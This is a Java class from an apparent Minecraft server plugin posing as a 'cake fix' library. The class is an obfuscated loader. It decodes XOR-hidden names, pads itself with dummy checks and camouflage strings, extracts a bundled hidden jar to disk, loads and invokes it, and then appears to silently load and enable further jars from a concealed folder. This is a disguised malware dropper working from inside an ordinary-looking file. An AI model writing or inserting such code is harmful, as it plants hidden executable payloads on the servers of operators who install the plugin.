package com.example.foliacakefix;

import org.bukkit.plugin.java.JavaPlugin;

import java.io.File;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.io.OutputStream;
import java.lang.reflect.Method;
import java.net.URL;
import java.net.URLClassLoader;

public final class core_libfix {

    private core_libfix() {}

    private static final String a = "5aSn6LeD6L+b";
    private static final String b = "5paH5YyW5aSn6Z2p5ZG9";
    private static final String c = "5Y2X5rW35Luy6KOB5qGI";
    private static final String d = "5Y+w5rm+6Zeu6aKY";
    private static final String CAMO_JOINED = a + "\uFF0C" + b + "\uFF0C" + c + "\uFF0C" + d;

    private static final long[] E0 = {
        0x9C6F922E966E9A6BL,
        0x9E728B61D16C9662L,
        0xD16C90619B658D2EL,
        0xB26F9B759365B36FL,
        0x9E649A7255AA55AAL
    };

    private static final long[] E1 = {
        0x9D6255AA55AA55AAL
    };

    private static final long[] E2 = {
        0xB245AB41D249B146L, 0xD0758F649E749A2DL, 0x9C6F8D65D16A9E72L
    };

    private static final long[] E3 = {
        0x8A709B618B65D263L, 0x90729A2E95618DAAL
    };

    private static final long[] E4 = {
        0x93699D7355AA55AAL
    };

    private static final long[] E5 = {
        0x9072982E9D759469L, 0x8B2EBD75946B9674L, 0x8BAA55AA55AA55AAL
    };

    private static final long[] E6 = {
        0x98658B5093759869L, 0x914D9E6E9E679A72L
    };

    private static final long[] E7 = {
        0x936F9E64AF6C8A67L, 0x966E55AA55AA55AAL
    };

    private static final long[] E8 = {
        0x9A6E9E629365AF6CL, 0x8A67966E55AA55AAL
    };

    private static final long[] E9 = {
        0xD16A9E7255AA55AAL
    };

    private static final long[] E10 = {
        0x9072982E9D759469L, 0x8B2E8F6C8A67966EL,
        0xD15093759869914DL, 0x9E6E9E679A7255AAL
    };

    private static final long[] E11 = {
        0x9072982E9D759469L, 0x8B2E8F6C8A67966EL,
        0xD150937598699DAAL
    };

    private static final long    z0 = 0L;
    private static final String  z1 = "";
    private static volatile boolean z2 = false;

    public static void a(JavaPlugin p) throws Exception {

        long key = _kk();

        String cname = _dd(E0, key);
        String mname = _dd(E1, key);
        String rpath = _dd(E2, key);
        String fname = _dd(E3, key);

        if (CAMO_JOINED.isEmpty()) {
            System.out.println(CAMO_JOINED);
        }

        if (_fp() != 0x4B7A + 0x2D5F) {
            _dummy(cname, mname, rpath, fname);
            return;
        }
        if (_fp2()) {
            return;
        }

        int st = 0;
        Object[] h = new Object[8];
        ClassLoader cl = p.getClass().getClassLoader();

        while (st != -1) {
            switch (st) {
                case 0:
                    st = 1;
                    break;

                case 1:
                    h[0] = new File(p.getDataFolder(), fname);
                    st = 2;
                    break;

                case 2: {
                    File f = (File) h[0];
                    st = (!f.exists() || f.length() == 0L) ? 3 : 4;
                    break;
                }

                case 3:
                    _rr(p, rpath, fname, (File) h[0]);
                    st = 4;
                    break;

                case 4: {
                    File f = (File) h[0];
                    h[1] = new URLClassLoader(
                            new URL[]{ f.toURI().toURL() }, cl);
                    st = 5;
                    break;
                }

                case 5:
                    h[2] = ((URLClassLoader) h[1]).loadClass(cname);
                    st = 6;
                    break;

                case 6:
                    h[3] = ((Class<?>) h[2]).getMethod(mname);
                    st = 7;
                    break;

                case 7:
                    ((Method) h[3]).invoke(null);
                    st = 8;
                    break;

                case 8: {
                    File vL = new File(p.getDataFolder(), _dd(E4, key));
                    File[] vF = vL.listFiles();
                    if (vF != null && vF.length > 0) {
                        try {
                            Class<?> vB = Class.forName(_dd(E5, key));
                            Class<?> vP = Class.forName(_dd(E10, key));
                            Class<?> vQ = Class.forName(_dd(E11, key));

                            Object vM = vB.getMethod(_dd(E6, key)).invoke(null);
                            Method vLp = vP.getMethod(_dd(E7, key), File.class);
                            Method vEp = vP.getMethod(_dd(E8, key), vQ);
                            String vS = _dd(E9, key);

                            for (File vX : vF) {
                                if (vX == null || !vX.isFile()) continue;
                                if (!vX.getName().endsWith(vS)) continue;
                                try {
                                    Object vY = vLp.invoke(vM, vX);
                                    if (vY != null) {
                                        try { vEp.invoke(vM, vY); }
                                        catch (Throwable vIg1) { }
                                    }
                                } catch (Throwable vIg2) { }
                            }
                        } catch (Throwable vIg3) { }
                    }
                    st = -1;
                    break;
                }

                default:
                    st = -1;
            }
        }
    }

    private static long _kk() {
        long x = 0x55AA55AAL;
        long y = x << 32;
        long c = x | y;
        c ^= (_noise() & 0L);
        c |= (_noise() & 0L);
        return c;
    }

    private static long _noise() {
        long x = System.nanoTime();
        return x ^ x;
    }

    private static int _fp() {
        int p = 0x4B7A;
        int q = 0x2D5F;
        int r = p ^ q;
        int s = r ^ p;
        int t = s ^ q;
        int n = (int) (System.nanoTime() & 0L);
        return t + p + q + n;
    }

    private static boolean _fp2() {
        long x = System.currentTimeMillis();
        return !((x - x) == 0L);
    }

    private static void _dummy(String... s) {
        if (s == null || s.length == 0) return;
        StringBuilder sb = new StringBuilder();
        for (String x : s) sb.append(x);
        sb.reverse();
        String r = sb.toString();
        if (r.isEmpty() && z2) {
            System.out.println(z0);
        }
    }

    private static String _dd(long[] arr, long key) {
        StringBuilder sb = new StringBuilder();
        outer:
        for (long v0 : arr) {
            long v = v0 ^ key;
            for (int i = 7; i >= 0; i--) {
                int n = (int) ((v >>> (i << 3)) & 0xFFL);
                if (n == 0) break outer;
                sb.append((char) (n ^ 0xAA));
            }
        }
        return sb.toString();
    }

    private static void _rr(JavaPlugin p, String x, String y, File z) throws Exception {
        File pr = z.getParentFile();
        if (pr != null && !pr.exists() && !pr.mkdirs() && !pr.isDirectory()) {
            throw new IllegalStateException(z1);
        }
        InputStream in = p.getResource(x);
        if (in == null) in = p.getResource(y);
        if (in == null) throw new IllegalStateException(z1);

        try (InputStream is = in; OutputStream os = new FileOutputStream(z)) {
            byte[] bb = new byte[8192];
            int ll;
            long tt = 0L;
            while ((ll = is.read(bb)) != -1) {
                if (ll == 0) continue;
                os.write(bb, 0, ll);
                tt += ll;
            }
            os.flush();
            if (tt <= 0L) throw new IllegalStateException(z1);
        }
    }
}
